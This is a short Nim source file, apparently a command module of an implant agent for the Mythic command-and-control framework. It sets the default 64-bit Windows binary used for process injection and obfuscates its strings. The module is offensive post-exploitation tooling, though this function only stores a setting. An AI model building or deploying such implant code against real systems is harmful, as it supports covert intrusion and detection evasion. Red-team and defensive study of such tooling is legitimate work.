import ../utils/mythic_responses
import ../utils/debug
import ../utils/strenc
import ../global_data
import std/[json, strformat]

proc spawnto_x64*(taskId: string, params: JsonNode): JsonNode =
  ## Set the default x64 binary for process injection
  when defined(windows):
    try:
      # Parse parameters
      let application = params[obf("application")].getStr()
      let arguments = if params.hasKey(obf("arguments")): params[obf("arguments")].getStr() else: ""
      
      debug &"[DEBUG] spawnto_x64: Setting to {application} with args: {arguments}"
      
      # Set global spawnto values
      setSpawntoX64(application, arguments)
      
      let output = obf("Set new spawnto_x64 to ") & application
      return mythicSuccess(taskId, output)
      
    except Exception as e:
      return mythicError(taskId, obf("spawnto_x64 error: ") & e.msg)
  
  when defined(linux):
    return mythicError(taskId, obf("spawnto_x64 is only available on Windows"))